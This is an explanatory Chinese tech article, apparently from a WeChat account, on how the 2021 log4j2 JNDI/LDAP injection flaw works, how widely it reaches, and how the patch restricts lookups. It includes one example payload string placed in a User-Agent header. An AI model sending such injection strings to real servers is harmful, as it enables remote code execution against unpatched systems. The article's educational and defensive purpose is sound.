----------------------------------------
----------------------------------------
#  核弹级漏洞！我把log4j扒给你看！

[ Github掘金计划 ](javascript:void\(0\);)

**Github掘金计划** ![]()

微信号 GithubStar

功能介绍 用心发掘 Github 和 Gitee 上优质的开源项目。

____

_2021-12-14 14:04_ _发表于_

收录于合集

以下文章来源于编程技术宇宙 ，作者轩辕之风O

![](images/0)
**编程技术宇宙** .

用故事说技术，编程从未如此有趣

相信大家这两天应该被这么一条新闻刷屏了：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNzZ1j9nMxCECCnNYA5uZEWyxQlGT3jaPzBI5LZ9FCbHbGnmwdiaYAoqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **这个漏洞到底是怎么回事？**

 **核弹级，真的有那么厉害吗？**

 **怎么利用这个漏洞呢？**

我看了很多技术分析文章，都太过专业，很多非Java技术栈或者不搞安全的人只能看个一知半解，导致大家只能看个热闹，对这个漏洞的成因、原理、利用方式、影响面理解的不到位。

这篇文章，我尝试让所有技术相关的朋友都能看懂： **这个注定会载入网络安全史册上的漏洞，到底是怎么一回事！**

##  log4j2

不管是什么编程语言，不管是前端后端还是客户端，对 **打日志** 都不会陌生。

通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。

在Java技术栈中，用的比较多的日志输出框架主要是 **log4j2** 和 **logback** 。

今天讨论的主角就是log4j2。

我们经常会在日志中输出一些变量，比如：

    
    
    logger.info("client ip: {}", clientIp)  
    

现在思考一个问题：

假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？

log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫 **Lookup** 的东西，可以用来输出更多内容：

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbN2GJcHcU8qlQW4hgavdpF6uSdFXzv48kLAVlH5jOT25p5EIH4TJHQpA/640?wx_fmt=png)

lookup，顾名思义就是查找、搜索的意思，那在log4j2中，就是允许在输出日志的时候，通过某种方式去查找要输出的内容。

lookup相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。

好在，log4j2已经帮我们把常见的查找途径都进行实现了：

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNYWSpqhDoyYACBic7ATV7ReibT6c7ibUCqlaBuwwd2yW8HFVe1uYS8zu1w/640?wx_fmt=png)

具体每一个的意思，这里就不详述了，这不是本文的重点。

## JNDI

主要来看其中那个叫JNDI的东西：

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNzIafupXz8GuEVPLd9KbatlDv8SkYH7dgnBFBpbJkkHCFelURIz7icOg/640?wx_fmt=png)

> JNDI即`Java Naming and Directory
> Interface`（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。

看不懂？看不懂就对了！

简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。

那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNeENuNlFkHMkcT9X0iacEatzVfLtbJtrYXTVG7ucXbb9IFdVicyalMiaiaA/640?wx_fmt=png)

## LDAP

继续把目光聚焦，咱们只看这个叫 **LDAP** 的东西。

> LDAP即`Lightweight Directory Access
> Protocol`（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。

看不懂？看不懂就对了！

这个东西用在统一身份认证领域比较多，但今天也不是这篇文章的重点。你只需要简单粗暴理解：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。

## 漏洞原理

好了，有了以上的基础，再来理解这个漏洞就很容易了。

假如某一个Java程序中，将浏览器的类型记录到了日志中：

    
    
    String userAgent = request.getHeader("User-Agent");  
    logger.info(userAgent);  
    

网络安全中有一个准则： **不要信任用户输入的任何信息** 。

这其中，`User-Agent`就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。

假如有人发来了一个HTTP请求，他的`User-Agent`是这样一个字符串：

> ${jndi:ldap://127.0.0.1/exploit}

接下来，log4j2将会对这行要输出的字符串进行解析。

首先，它发现了字符串中有 **${}** ，知道这个里面包裹的内容是要单独处理的。

进一步解析，发现是JNDI扩展内容。

再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。

最后，调用具体负责LDAP的模块去请求对应的数据。

如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！

Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。

如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming
References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。

>
> PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。

注意，这里就是核心问题了： **JNDI可以远程下载class文件来构建对象！！！** 。

危险在哪里？

如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那不就完犊子了吗？

还没看懂？没关系，我画了一张图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNKpiaAF7nSbsY9eFyfwae8Ffkhb6vM2La3EHGD3CXFibXicyEIpxxZASIA/640?wx_fmt=png)

这就是鼎鼎大名的JNDI注入攻击！

其实除了LDAP，还有RMI的方式，有兴趣的可以了解下。

## JNDI 注入

其实这种攻击手法不是这一次出现了，早在2016的blackhat大会上，就有大佬披露了这种攻击方式。

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbN40UjqJJ9ZuAW5ppORylS3h5BzEyYyrwuZzVCDXJqQkw2MScz8QTChw/640?wx_fmt=png)

回过头来看，问题的核心在于：  

Java允许通过JNDI远程去下载一个class文件来加载对象，如果这个远程地址是自己的服务器，那还好说，如果是可以被外界来指定的地址，那就要出大问题！

前面的例子中，一直用的127.0.0.1来代替LDAP服务器地址，那如果输入的User-Agent字符串中不是这个地址，而是一个恶意服务器地址呢？

## 影响规模

这一次漏洞的影响面之所以如此之大，主要还是log4j2的使用面实在是太广了。

一方面现在Java技术栈在Web、后端开发、大数据等领域应用非常广泛，国内除了阿里巴巴、京东、美团等一大片以Java为主要技术栈的公司外，还有多如牛毛的中小企业选择Java。

另一方面，还有好多像kafka、elasticsearch、flink这样的大量中间件都是用Java语言开发的。

在上面这些开发过程中，大量使用了log4j2作为日志输出。只要一个不留神，输出的日志有外部输入混进来，那直接就是远程代码执行RCE，灭顶之灾！

## 修复

新版的log4j2已经修复了这个问题，大家赶紧升级。

下面是log4j2官网中关于JNDI lookup的说明：

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNy3LnQRZiaSVRIGghO3VCC0hBFvbC6DvOLwwnULDNds6p0E7eKSNATXg/640?wx_fmt=png)

我通过搜索引擎找到了缓存的12月10号前的快照，大家对比一下，比起下面这个缓存，上面那一版多了哪些东西？

![图片](https://mmbiz.qpic.cn/mmbiz_png/jXQDbLkGBYWlSHxFbjAu75C0gNz7tGbNdXqqu6jUGHibWECO7v3ZwPlpu65SIPRO6pcYKDncGQIVjibiaCogIXosQ/640?wx_fmt=png)

答案是：修复后的log4j2在JNDI lookup中增加了很多的限制：

>   1. 默认不再支持二次跳转（也就是命名引用）的方式获取对象
>   2. 只有在log4j2.allowedLdapClasses列表中指定的class才能获取。
>   3. 只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取
>

以上几道限制，算是彻底封锁了通过打印日志去远程加载class的这条路了。

最后，手机前的各位Java小伙伴儿们，你们写的程序中有用到log4j2吗，有没有某个地方的输出，有外部的参数混进来呢？

赶紧检查检查哦！

## 推荐

  * [Github掘金计划](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzIwNDgzMzI3Mg==&action=getalbum&album_id=1571213952619954180#wechat_redirect) ：历史优质原创汇总！用心发掘 Github 和 Gitee 上优质的开源项目。
  * [编程基础](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1632585323454971905&__biz=MzIwNDgzMzI3Mg==#wechat_redirect) ：精选编程基础如学习路线、编程语言相关的开源项目。
  * [计算机基础](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1635325633234780161&__biz=MzIwNDgzMzI3Mg==#wechat_redirect)：精选计算机基础（操作系统、计算机网络、算法、数据结构）相关的开源项目。
  * [技术面试](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1632589980491366403&__biz=MzIwNDgzMzI3Mg==#wechat_redirect) ：精选技术面试相关的开源项目。
  * [项目实战](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1632590550748938241&__biz=MzIwNDgzMzI3Mg==#wechat_redirect) ：精选实战类型的开源项目。
  * [神器工具&网站](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzIwNDgzMzI3Mg==&action=getalbum&album_id=1692140336665378820#wechat_redirect) : 一些好用的插件、软件、网站。

如果你也有好的开源项目推荐的话，欢迎添加我的微信。备注“加群”我拉你进群。

![图片](https://mmbiz.qpic.cn/mmbiz_png/BcyAypujBVZicmqoVNJbBhEKKIGFI8OGS6UoEicMO6j8Vw1v1Ah40Sc1cJgZFAzSMtL1r2iav2eZhNgsGSfJ3NCDg/640?wx_fmt=png)

用心发掘 Github 和 Gitee 上优质的开源项目。

欢迎关注！欢迎点赞分享！

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/BcyAypujBVZqeicvzhcGl7FLyAw3Xsu2POdZOiaPnQXryMp8gyzkcKF4NGgOydQcCWhicNREhf8fQ1euq2lTzhrtA/640?wx_fmt=jpeg)

预览时标签不可点

